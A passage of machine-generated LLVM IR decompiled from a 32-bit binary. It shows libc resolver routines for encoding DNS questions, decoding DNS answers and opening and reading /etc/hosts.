  %v1_8059bd5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059bd5 = add i32 %v1_8059bd5, 44
  %v3_8059bd5 = inttoptr i32 %v2_8059bd5 to i32*
  store i32 %v2_8059bd3, i32* %v3_8059bd5, align 4
  %v2_8059bdd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059bdd, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 40, { 20, 21, 29, 10, 30, 22, 23, 13, 14, 15, 16, 17, 11, 31, 4, 5, 24, 3, 19, 25, 26, 27, 28, 12, 18, 1, 0, 6, 7, 8, 9, 2 }
  uselistorder i32 28, { 39, 40, 22, 23, 64, 53, 65, 68, 69, 70, 48, 41, 42, 0, 43, 44, 45, 46, 47, 3, 4, 5, 1, 24, 25, 26, 27, 28, 29, 6, 17, 18, 19, 67, 10, 11, 66, 9, 71, 34, 49, 54, 55, 50, 51, 57, 58, 59, 60, 61, 62, 2, 63, 74, 56, 30, 75, 76, 79, 80, 77, 78, 72, 73, 31, 32, 33, 35, 36, 12, 13, 8, 14, 15, 16, 37, 38, 20, 21, 7, 52 }
  uselistorder i8 2, { 1, 2, 3, 4, 7, 8, 9, 20, 10, 0, 23, 24, 11, 12, 13, 14, 15, 21, 22, 16, 17, 18, 19, 5, 6 }
  uselistorder i8 8, { 0, 2, 1, 4, 3, 5, 6, 7 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8059be0 = load i32, i32* @edi, align 4
  %v0_8059be1 = load i32, i32* @esi, align 4
  %v0_8059be2 = load i32, i32* @ebx, align 4
  store i32 %v0_8059be2, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8059bef = load i32, i32* @eax, align 4
  %v1_8059bf2 = inttoptr i32 %tmp to i32*
  %v2_8059bf2 = load i32, i32* %v1_8059bf2, align 4
  %v7_8059bf4 = inttoptr i32 %v2_8059bf2 to i8*
  %v8_8059bf4 = call i32 @__encode_dotted(i8* %v7_8059bf4, i32 %tmp2, i32 %tmp3, i32 %v0_8059bef, i32 %v0_8059be2, i32 %v0_8059be1, i32 %v0_8059be0)
  %v2_8059bfc = icmp slt i32 %v8_8059bf4, 0
  store i32 %v8_8059bf4, i32* @ecx, align 4
  br i1 %v2_8059bfc, label %dec_label_pc_8059c2d, label %dec_label_pc_8059c02

dec_label_pc_8059c02:                             ; preds = %entry
  %v0_8059c02 = load i32, i32* @ebx, align 4
  %v2_8059c02 = sub i32 %v0_8059c02, %v8_8059bf4
  %v1_8059c04 = add i32 %v2_8059c02, -3
  %v6_8059c04 = sub i32 2, %v2_8059c02
  %v7_8059c04 = and i32 %v6_8059c04, %v2_8059c02
  %v8_8059c04 = icmp slt i32 %v7_8059c04, 0
  %v9_8059c04 = icmp eq i32 %v1_8059c04, 0
  %v10_8059c04 = icmp slt i32 %v1_8059c04, 0
  %v3_8059c07 = icmp eq i1 %v10_8059c04, %v8_8059c04
  %v4_8059c07 = icmp eq i1 %v9_8059c04, false
  %v5_8059c07 = and i1 %v4_8059c07, %v3_8059c07
  br i1 %v5_8059c07, label %dec_label_pc_8059c0e, label %dec_label_pc_8059c09

dec_label_pc_8059c09:                             ; preds = %dec_label_pc_8059c02
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8059c2d

dec_label_pc_8059c0e:                             ; preds = %dec_label_pc_8059c02
  %v0_8059c0e = load i32, i32* @edi, align 4
  %v2_8059c0e = add i32 %v0_8059c0e, %v8_8059bf4
  store i32 %v2_8059c0e, i32* @edx, align 4
  %v0_8059c11 = load i32, i32* @esi, align 4
  %v1_8059c11 = add i32 %v0_8059c11, 5
  %v2_8059c11 = inttoptr i32 %v1_8059c11 to i8*
  %v3_8059c11 = load i8, i8* %v2_8059c11, align 1
  %v1_8059c15 = add i32 %v8_8059bf4, 4
  store i32 %v1_8059c15, i32* @ecx, align 4
  %v3_8059c18 = inttoptr i32 %v2_8059c0e to i8*
  store i8 %v3_8059c11, i8* %v3_8059c18, align 1
  %v0_8059c1a = load i32, i32* @esi, align 4
  %v1_8059c1a = add i32 %v0_8059c1a, 4
  %v2_8059c1a = inttoptr i32 %v1_8059c1a to i32*
  %v3_8059c1a = load i32, i32* %v2_8059c1a, align 4
  %v1_8059c1d = trunc i32 %v3_8059c1a to i8
  %v2_8059c1d = load i32, i32* @edx, align 4
  %v3_8059c1d = add i32 %v2_8059c1d, 1
  %v4_8059c1d = inttoptr i32 %v3_8059c1d to i8*
  store i8 %v1_8059c1d, i8* %v4_8059c1d, align 1
  %v0_8059c20 = load i32, i32* @esi, align 4
  %v1_8059c20 = add i32 %v0_8059c20, 9
  %v2_8059c20 = inttoptr i32 %v1_8059c20 to i8*
  %v3_8059c20 = load i8, i8* %v2_8059c20, align 1
  %v2_8059c24 = load i32, i32* @edx, align 4
  %v3_8059c24 = add i32 %v2_8059c24, 2
  %v4_8059c24 = inttoptr i32 %v3_8059c24 to i8*
  store i8 %v3_8059c20, i8* %v4_8059c24, align 1
  %v0_8059c27 = load i32, i32* @esi, align 4
  %v1_8059c27 = add i32 %v0_8059c27, 8
  %v2_8059c27 = inttoptr i32 %v1_8059c27 to i32*
  %v3_8059c27 = load i32, i32* %v2_8059c27, align 4
  %v1_8059c2a = trunc i32 %v3_8059c27 to i8
  %v2_8059c2a = load i32, i32* @edx, align 4
  %v3_8059c2a = add i32 %v2_8059c2a, 3
  %v4_8059c2a = inttoptr i32 %v3_8059c2a to i8*
  store i8 %v1_8059c2a, i8* %v4_8059c2a, align 1
  %v0_8059c2e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8059c2d

dec_label_pc_8059c2d:                             ; preds = %entry, %dec_label_pc_8059c09, %dec_label_pc_8059c0e
  %v0_8059c2e = phi i32 [ %v8_8059bf4, %entry ], [ -1, %dec_label_pc_8059c09 ], [ %v0_8059c2e.pre, %dec_label_pc_8059c0e ]
  %v2_8059c2d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059c2d, i32* @ebx, align 4
  store i32 %v0_8059be0, i32* @edi, align 4
  ret i32 %v0_8059c2e

; uselistorder directives
  uselistorder i32 %v1_8059c04, { 1, 0 }
  uselistorder i32 %v2_8059c02, { 0, 2, 1 }
  uselistorder i32 %v8_8059bf4, { 1, 2, 0, 4, 5, 3 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_8059c2d, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8059c3f = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8059c44 = icmp slt i32 %v2_8059c3f, 0
  %v1_8059c46 = add i32 %v2_8059c3f, 4
  %v1_8059c49 = icmp eq i1 %v2_8059c44, false
  %v4_8059c49 = select i1 %v1_8059c49, i32 %v1_8059c46, i32 %v2_8059c3f
  ret i32 %v4_8059c49

; uselistorder directives
  uselistorder i32 %v2_8059c3f, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8059c50 = load i32, i32* @ebp, align 4
  %v0_8059c51 = load i32, i32* @edi, align 4
  %v0_8059c52 = load i32, i32* @esi, align 4
  %v0_8059c53 = load i32, i32* @ebx, align 4
  store i32 %v0_8059c53, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8059c74 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8059c74, i32* %eax.global-to-local, align 4
  %v4_8059c81 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8059c74, i32 256)
  store i32 %v4_8059c81, i32* %eax.global-to-local, align 4
  %v3_8059c89 = icmp slt i32 %v4_8059c81, 0
  store i32 %v4_8059c81, i32* @edi, align 4
  br i1 %v3_8059c89, label %dec_label_pc_8059d3c, label %dec_label_pc_8059c93

dec_label_pc_8059c93:                             ; preds = %entry
  %v0_8059c93 = load i32, i32* @ebx, align 4
  %v3_8059c93 = add i32 %v0_8059c93, %v4_8059c81
  %v0_8059c95 = load i32, i32* @esi, align 4
  %v2_8059c95 = sub i32 %v0_8059c95, %v3_8059c93
  %v1_8059c97 = add i32 %v2_8059c95, -10
  %v10_8059c97 = icmp slt i32 %v1_8059c97, 0
  store i32 %v1_8059c97, i32* @esi, align 4
  %v1_8059ca2 = icmp eq i1 %v10_8059c97, false
  br i1 %v1_8059ca2, label %dec_label_pc_8059cab, label %dec_label_pc_8059ca4

dec_label_pc_8059ca4:                             ; preds = %dec_label_pc_8059c93
  br label %dec_label_pc_8059d3c

dec_label_pc_8059cab:                             ; preds = %dec_label_pc_8059c93
  %v6_8059cb2 = add i32 %v3_8059c93, %tmp4
  store i32 %v6_8059cb2, i32* @ebx, align 4
  store i32 %v2_8059c74, i32* %eax.global-to-local, align 4
  %v1_8059cbe = bitcast i32* %stack_var_-272 to i8*
  %v2_8059cbe = call i32 @__GI_strdup(i8* %v1_8059cbe)
  store i32 %v2_8059cbe, i32* %eax.global-to-local, align 4
  %v0_8059cc3 = load i32, i32* @ebx, align 4
  %v1_8059cc3 = add i32 %v0_8059cc3, 4
  store i32 %v1_8059cc3, i32* %esi.global-to-local, align 4
  %v1_8059cc6 = load i32, i32* @ebp, align 4
  %v2_8059cc6 = inttoptr i32 %v1_8059cc6 to i32*
  store i32 %v2_8059cbe, i32* %v2_8059cc6, align 4
  %v0_8059cc9 = load i32, i32* @ebx, align 4
  %v1_8059cc9 = inttoptr i32 %v0_8059cc9 to i8*
  %v2_8059cc9 = load i8, i8* %v1_8059cc9, align 1
  %v3_8059cc9 = zext i8 %v2_8059cc9 to i32
  store i32 %v3_8059cc9, i32* %eax.global-to-local, align 4
  %v1_8059ccc = add i32 %v0_8059cc9, 1
  %v2_8059ccc = inttoptr i32 %v1_8059ccc to i8*
  %v3_8059ccc = load i8, i8* %v2_8059ccc, align 1
  %v4_8059ccc = zext i8 %v3_8059ccc to i32
  store i32 %v4_8059ccc, i32* %edx.global-to-local, align 4
  %v2_8059cd0 = mul nuw nsw i32 %v3_8059cc9, 256
  %v2_8059cd3 = or i32 %v4_8059ccc, %v2_8059cd0
  store i32 %v2_8059cd3, i32* %eax.global-to-local, align 4
  %v1_8059cd5 = load i32, i32* @ebp, align 4
  %v2_8059cd5 = add i32 %v1_8059cd5, 4
  %v3_8059cd5 = inttoptr i32 %v2_8059cd5 to i32*
  store i32 %v2_8059cd3, i32* %v3_8059cd5, align 4
  %v0_8059cd8 = load i32, i32* @ebx, align 4
  %v1_8059cd8 = add i32 %v0_8059cd8, 2
  %v2_8059cd8 = inttoptr i32 %v1_8059cd8 to i8*
  %v3_8059cd8 = load i8, i8* %v2_8059cd8, align 1
  %v4_8059cd8 = zext i8 %v3_8059cd8 to i32
  store i32 %v4_8059cd8, i32* %eax.global-to-local, align 4
  %v1_8059cdc = add i32 %v0_8059cd8, 3
  %v2_8059cdc = inttoptr i32 %v1_8059cdc to i8*
  %v3_8059cdc = load i8, i8* %v2_8059cdc, align 1
  %v4_8059cdc = zext i8 %v3_8059cdc to i32
  store i32 %v4_8059cdc, i32* %edx.global-to-local, align 4
  %v2_8059ce0 = mul nuw nsw i32 %v4_8059cd8, 256
  %v2_8059ce3 = or i32 %v4_8059cdc, %v2_8059ce0
  store i32 %v2_8059ce3, i32* %eax.global-to-local, align 4
  %v1_8059ce5 = load i32, i32* @ebp, align 4
  %v2_8059ce5 = add i32 %v1_8059ce5, 8
  %v3_8059ce5 = inttoptr i32 %v2_8059ce5 to i32*
  store i32 %v2_8059ce3, i32* %v3_8059ce5, align 4
  %v0_8059ce8 = load i32, i32* @ebx, align 4
  %v1_8059ce8 = add i32 %v0_8059ce8, 4
  %v2_8059ce8 = inttoptr i32 %v1_8059ce8 to i8*
  %v3_8059ce8 = load i8, i8* %v2_8059ce8, align 1
  %v4_8059ce8 = zext i8 %v3_8059ce8 to i32
  store i32 %v4_8059ce8, i32* %edx.global-to-local, align 4
  %v0_8059cec = load i32, i32* %esi.global-to-local, align 4
  %v1_8059cec = add i32 %v0_8059cec, 1
  %v2_8059cec = inttoptr i32 %v1_8059cec to i8*
  %v3_8059cec = load i8, i8* %v2_8059cec, align 1
  %v4_8059cec = zext i8 %v3_8059cec to i32
  store i32 %v4_8059cec, i32* %eax.global-to-local, align 4
  %v1_8059cf0 = add i32 %v0_8059cec, 2
  %v2_8059cf0 = inttoptr i32 %v1_8059cf0 to i8*
  %v3_8059cf0 = load i8, i8* %v2_8059cf0, align 1
  %v4_8059cf0 = zext i8 %v3_8059cf0 to i32
  %v2_8059cf4 = mul nuw i32 %v4_8059ce8, 16777216
  %v2_8059cf7 = mul nuw nsw i32 %v4_8059cec, 65536
  store i32 %v2_8059cf7, i32* %eax.global-to-local, align 4
  %v2_8059cfa = or i32 %v2_8059cf7, %v2_8059cf4
  store i32 %v2_8059cfa, i32* %edx.global-to-local, align 4
  %v1_8059cfc = add i32 %v0_8059cec, 3
  %v2_8059cfc = inttoptr i32 %v1_8059cfc to i8*
  %v3_8059cfc = load i8, i8* %v2_8059cfc, align 1
  %v4_8059cfc = zext i8 %v3_8059cfc to i32
  store i32 %v4_8059cfc, i32* %eax.global-to-local, align 4
  %v2_8059d00 = mul nuw nsw i32 %v4_8059cf0, 256
  %v2_8059d03 = or i32 %v4_8059cfc, %v2_8059cfa
  store i32 %v2_8059d03, i32* %edx.global-to-local, align 4
  %v2_8059d05 = or i32 %v2_8059d03, %v2_8059d00
  store i32 %v2_8059d05, i32* @ecx, align 4
  %v1_8059d07 = load i32, i32* @ebp, align 4
  %v2_8059d07 = add i32 %v1_8059d07, 12
  %v3_8059d07 = inttoptr i32 %v2_8059d07 to i32*
  store i32 %v2_8059d05, i32* %v3_8059d07, align 4
  %v0_8059d0a = load i32, i32* @ebx, align 4
  %v1_8059d0a = add i32 %v0_8059d0a, 8
  %v2_8059d0a = inttoptr i32 %v1_8059d0a to i8*
  %v3_8059d0a = load i8, i8* %v2_8059d0a, align 1
  %v4_8059d0a = zext i8 %v3_8059d0a to i32
  store i32 %v4_8059d0a, i32* %edx.global-to-local, align 4
  %v1_8059d0e = add i32 %v0_8059d0a, 9
  %v2_8059d0e = inttoptr i32 %v1_8059d0e to i8*
  %v3_8059d0e = load i8, i8* %v2_8059d0e, align 1
  %v4_8059d0e = zext i8 %v3_8059d0e to i32
  store i32 %v4_8059d0e, i32* %eax.global-to-local, align 4
  %v1_8059d12 = add i32 %v0_8059d0a, 10
  %v1_8059d15 = load i32, i32* @ebp, align 4
  %v2_8059d15 = add i32 %v1_8059d15, 20
  %v3_8059d15 = inttoptr i32 %v2_8059d15 to i32*
  store i32 %v1_8059d12, i32* %v3_8059d15, align 4
  %v0_8059d18 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059d18 = mul i32 %v0_8059d18, 256
  %v1_8059d1b = load i32, i32* %eax.global-to-local, align 4
  %v2_8059d1b = or i32 %v1_8059d1b, %v2_8059d18
  store i32 %v2_8059d1b, i32* @edx, align 4
  %v1_8059d1d = load i32, i32* @ebp, align 4
  %v2_8059d1d = add i32 %v1_8059d1d, 16
  %v3_8059d1d = inttoptr i32 %v2_8059d1d to i32*
  store i32 %v2_8059d1b, i32* %v3_8059d1d, align 4
  %v1_8059d27 = add i32 %v3_8059c93, 10
  store i32 %v1_8059d27, i32* %eax.global-to-local, align 4
  %v1_8059d2a = load i32, i32* @ebp, align 4
  %v2_8059d2a = add i32 %v1_8059d2a, 24
  %v3_8059d2a = inttoptr i32 %v2_8059d2a to i32*
  store i32 %v1_8059d27, i32* %v3_8059d2a, align 4
  %v4_8059d2d = load i32, i32* @edx, align 4
  %v5_8059d31 = icmp slt i32 %v1_8059c97, %v4_8059d2d
  br i1 %v5_8059d31, label %dec_label_pc_8059d33, label %dec_label_pc_8059d38

dec_label_pc_8059d33:                             ; preds = %dec_label_pc_8059cab
  br label %dec_label_pc_8059d3c

dec_label_pc_8059d38:                             ; preds = %dec_label_pc_8059cab
  %v1_8059d38 = load i32, i32* @edi, align 4
  %v2_8059d38 = add i32 %v4_8059d2d, 10
  %v3_8059d38 = add i32 %v2_8059d38, %v1_8059d38
  br label %dec_label_pc_8059d3c

dec_label_pc_8059d3c:                             ; preds = %entry, %dec_label_pc_8059d33, %dec_label_pc_8059ca4, %dec_label_pc_8059d38
  %v0_8059d42 = phi i32 [ %v4_8059c81, %entry ], [ -1, %dec_label_pc_8059d33 ], [ %v1_8059c97, %dec_label_pc_8059ca4 ], [ %v3_8059d38, %dec_label_pc_8059d38 ]
  store i32 %v0_8059d42, i32* %eax.global-to-local, align 4
  %v2_8059d44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059d44, i32* @ebx, align 4
  store i32 %v0_8059c52, i32* @esi, align 4
  store i32 %v0_8059c51, i32* @edi, align 4
  store i32 %v0_8059c50, i32* @ebp, align 4
  ret i32 %v0_8059d42

; uselistorder directives
  uselistorder i32 %v0_8059d42, { 1, 0 }
  uselistorder i32 %v2_8059cf7, { 1, 0 }
  uselistorder i32 %v1_8059c97, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8059c93, { 1, 0, 2 }
  uselistorder i32 %v4_8059c81, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8059c74, { 1, 0, 2 }
  uselistorder i32 24, { 31, 32, 6, 4, 1, 5, 46, 49, 50, 0, 18, 19, 20, 21, 22, 2, 17, 48, 7, 33, 34, 35, 47, 9, 23, 38, 24, 51, 29, 36, 39, 40, 41, 42, 43, 44, 45, 53, 3, 37, 25, 52, 26, 27, 28, 55, 54, 30, 8, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 10, 8, 11, 9, 13, 12, 14 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 3, 4, 0, 1 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_8059d3c, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8059d59 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805d0cb.349 to i32), i32 ptrtoint (i32* @global_var_805cfdc.319 to i32))
  store i32 %v3_8059d59, i32* @eax, align 4
  %v1_8059d61 = icmp eq i32 %v3_8059d59, 0
  %v1_8059d63 = icmp eq i1 %v1_8059d61, false
  br i1 %v1_8059d63, label %dec_label_pc_8059d79, label %dec_label_pc_8059d65

dec_label_pc_8059d65:                             ; preds = %entry
  %v3_8059d71 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805d0d6.350 to i32), i32 ptrtoint (i32* @global_var_805cfdc.319 to i32))
  br label %dec_label_pc_8059d79

dec_label_pc_8059d79:                             ; preds = %entry, %dec_label_pc_8059d65
  %v0_8059d7c = phi i32 [ %v3_8059d59, %entry ], [ %v3_8059d71, %dec_label_pc_8059d65 ]
  ret i32 %v0_8059d7c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805cfdc.319 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8059d79, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8059d7d = load i32, i32* @ebp, align 4
  %v0_8059d7e = load i32, i32* @edi, align 4
  %v0_8059d7f = load i32, i32* @esi, align 4
  %v0_8059d80 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8059d8e = sub i32 0, %arg6
  %v1_8059d90 = urem i32 %v1_8059d8e, 4
  %v2_8059d90 = icmp eq i32 %v1_8059d90, 0
  store i32 %v1_8059d90, i32* %eax.global-to-local, align 4
  br i1 %v2_8059d90, label %dec_label_pc_8059da1, label %dec_label_pc_8059d95

dec_label_pc_8059d95:                             ; preds = %entry
  %v2_8059d95 = sub i32 %arg7, %v1_8059d90
  %v7_8059d95 = icmp ugt i32 %v1_8059d90, %arg7
  br i1 %v7_8059d95, label %dec_label_pc_805a045, label %dec_label_pc_8059d9d

dec_label_pc_8059d9d:                             ; preds = %dec_label_pc_8059d95
  %v2_8059d9d = add i32 %v1_8059d90, %arg6
  store i32 %v2_8059d9d, i32* @ebx, align 4
  store i32 %v2_8059d95, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059da1

dec_label_pc_8059da1:                             ; preds = %entry, %dec_label_pc_8059d9d
  %v0_8059daf = phi i32 [ %arg6, %entry ], [ %v2_8059d9d, %dec_label_pc_8059d9d ]
  %v0_8059db6 = phi i32 [ %arg7, %entry ], [ %v2_8059d95, %dec_label_pc_8059d9d ]
  %tmp = icmp ult i32 %v0_8059db6, 32
  br i1 %tmp, label %dec_label_pc_805a045, label %dec_label_pc_8059daa

dec_label_pc_8059daa:                             ; preds = %dec_label_pc_8059da1
  %v12_8059daa = icmp eq i32 %arg4, 1
  %v1_8059daf = add i32 %v0_8059daf, 32
  store i32 %v1_8059daf, i32* %eax.global-to-local, align 4
  %v1_8059db6 = add i32 %v0_8059db6, -32
  store i32 %v1_8059db6, i32* @ebp, align 4
  br i1 %v12_8059daa, label %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge, label %dec_label_pc_8059dbf

dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge: ; preds = %dec_label_pc_8059daa
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8059ef5

dec_label_pc_8059dbf:                             ; preds = %dec_label_pc_8059daa
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8059dc6 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8059dc6, align 4
  %tmp144 = icmp ult i32 %v1_8059db6, 4
  br i1 %tmp144, label %dec_label_pc_805a045, label %dec_label_pc_8059dd2

dec_label_pc_8059dd2:                             ; preds = %dec_label_pc_8059dbf
  %v0_8059dd2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059dd2 = add i32 %v0_8059dd2, -36
  store i32 %v1_8059dd2, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_8059dd2, 8
  br i1 %tmp145, label %dec_label_pc_805a045, label %dec_label_pc_8059dde

dec_label_pc_8059dde:                             ; preds = %dec_label_pc_8059dd2
  %v0_8059dde = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_8059dde, 16
  br i1 %tmp146, label %dec_label_pc_805a045, label %dec_label_pc_8059de7

dec_label_pc_8059de7:                             ; preds = %dec_label_pc_8059dde
  %v1_8059de7 = add i32 %v0_8059dd2, -48
  store i32 %v1_8059de7, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_8059de7, 8
  br i1 %tmp147, label %dec_label_pc_805a045, label %dec_label_pc_8059df3

dec_label_pc_8059df3:                             ; preds = %dec_label_pc_8059de7
  %v0_8059df3 = load i32, i32* @ebx, align 4
  %v1_8059df3 = add i32 %v0_8059df3, 48
  %v1_8059df6 = add i32 %v0_8059dd2, -44
  store i32 %v1_8059df6, i32* @ebp, align 4
  %v1_8059dfd = add i32 %v0_8059dd2, -56
  store i32 %v1_8059dfd, i32* @eax, align 4
  %v7_8059e00 = icmp ult i32 %v1_8059dfd, %v1_8059df6
  %v1_8059e02 = add i32 %v0_8059df3, 36
  store i32 %v1_8059e02, i32* @edi, align 4
  br i1 %v7_8059e00, label %dec_label_pc_8059e0c, label %dec_label_pc_8059e07

dec_label_pc_8059e07:                             ; preds = %dec_label_pc_8059df3
  %v1_8059e07 = add i32 %v0_8059df3, 44
  store i32 %v1_8059e07, i32* @esi, align 4
  br label %dec_label_pc_8059e11

dec_label_pc_8059e0c:                             ; preds = %dec_label_pc_8059df3
  %v1_8059e0c = add i32 %v0_8059df3, 56
  store i32 %v1_8059e0c, i32* @esi, align 4
  store i32 %v1_8059dfd, i32* @ebp, align 4
  br label %dec_label_pc_8059e11

dec_label_pc_8059e11:                             ; preds = %dec_label_pc_8059e07, %dec_label_pc_8059e0c
  %v0_8059e11 = phi i32 [ %v1_8059df6, %dec_label_pc_8059e07 ], [ %v1_8059dfd, %dec_label_pc_8059e0c ]
  %tmp148 = icmp ult i32 %v0_8059e11, 80
  br i1 %tmp148, label %dec_label_pc_805a045, label %dec_label_pc_8059e1a

dec_label_pc_8059e1a:                             ; preds = %dec_label_pc_8059e11
  %v0_8059e1a = call i32 @__open_etc_hosts()
  store i32 %v0_8059e1a, i32* %eax.global-to-local, align 4
  %v1_8059e1f = icmp eq i32 %v0_8059e1a, 0
  br i1 %v1_8059e1f, label %dec_label_pc_8059e47, label %dec_label_pc_8059e27

dec_label_pc_8059e27:                             ; preds = %dec_label_pc_8059e1a
  store i32 %v1_8059daf, i32* %edx.global-to-local, align 4
  store i32 %v1_8059df3, i32* %eax.global-to-local, align 4
  %v0_8059e2f = load i32, i32* @edi, align 4
  %v0_8059e33 = load i32, i32* @esi, align 4
  %v4_8059e37 = inttoptr i32 %v1_8059daf to i8*
  br label %dec_label_pc_8059ef5

dec_label_pc_8059e47:                             ; preds = %dec_label_pc_8059e1a
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8059e4b = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8059e4b, align 4
  %v1_8059e51 = call i32 @__errno_location(i32 0)
  store i32 %v1_8059e51, i32* %eax.global-to-local, align 4
  %v1_8059e56 = inttoptr i32 %v1_8059e51 to i32*
  %v2_8059e56 = load i32, i32* %v1_8059e56, align 4
  store i32 %v2_8059e56, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a045

dec_label_pc_8059e61:                             ; preds = %dec_label_pc_8059fc8
  %v2_8059e61 = load i8*, i8** %stack_var_-44, align 4
  %v3_8059e61 = ptrtoint i8* %v2_8059e61 to i32
  store i32 %v3_8059e61, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8059e68 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8059e61, i32* %v2_8059e68, align 4
  %v0_8059e6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8059e6a = add i32 %v0_8059e6a, 4
  %v2_8059e6a = inttoptr i32 %v1_8059e6a to i32*
  store i32 0, i32* %v2_8059e6a, align 4
  %v0_8059e71 = load i32, i32* @ebx, align 4
  %v1_8059e71 = add i32 %v0_8059e71, 4
  %v2_8059e71 = inttoptr i32 %v1_8059e71 to i32*
  %v3_8059e71 = load i32, i32* %v2_8059e71, align 4
  store i32 %v3_8059e71, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8059e71, i32* %arg5, align 4
  %v1_8059e7a = add i32 %tmp60, 8
  %v2_8059e7a = inttoptr i32 %v1_8059e7a to i32*
  store i32 2, i32* %v2_8059e7a, align 4
  %v0_8059e81 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059e81 = add i32 %v0_8059e81, 12
  %v2_8059e81 = inttoptr i32 %v1_8059e81 to i32*
  store i32 4, i32* %v2_8059e81, align 4
  br label %dec_label_pc_8059eba

dec_label_pc_8059e8e:                             ; preds = %dec_label_pc_8059fea
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8059e96 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8059e96, align 4
  %v0_8059e98 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059e98 = add i32 %v0_8059e98, 4
  %v2_8059e98 = inttoptr i32 %v1_8059e98 to i32*
  store i32 0, i32* %v2_8059e98, align 4
  %v0_8059e9f = load i32, i32* @ebx, align 4
  %v1_8059e9f = add i32 %v0_8059e9f, 4
  %v2_8059e9f = inttoptr i32 %v1_8059e9f to i32*
  %v3_8059e9f = load i32, i32* %v2_8059e9f, align 4
  store i32 %v3_8059e9f, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8059e9f, i32* %arg5, align 4
  %v1_8059ea8 = add i32 %tmp60, 8
  %v2_8059ea8 = inttoptr i32 %v1_8059ea8 to i32*
  store i32 10, i32* %v2_8059ea8, align 4
  %v0_8059eaf = load i32, i32* %edx.global-to-local, align 4
  %v1_8059eaf = add i32 %v0_8059eaf, 12
  %v2_8059eaf = inttoptr i32 %v1_8059eaf to i32*
  store i32 16, i32* %v2_8059eaf, align 4
  br label %dec_label_pc_8059eba

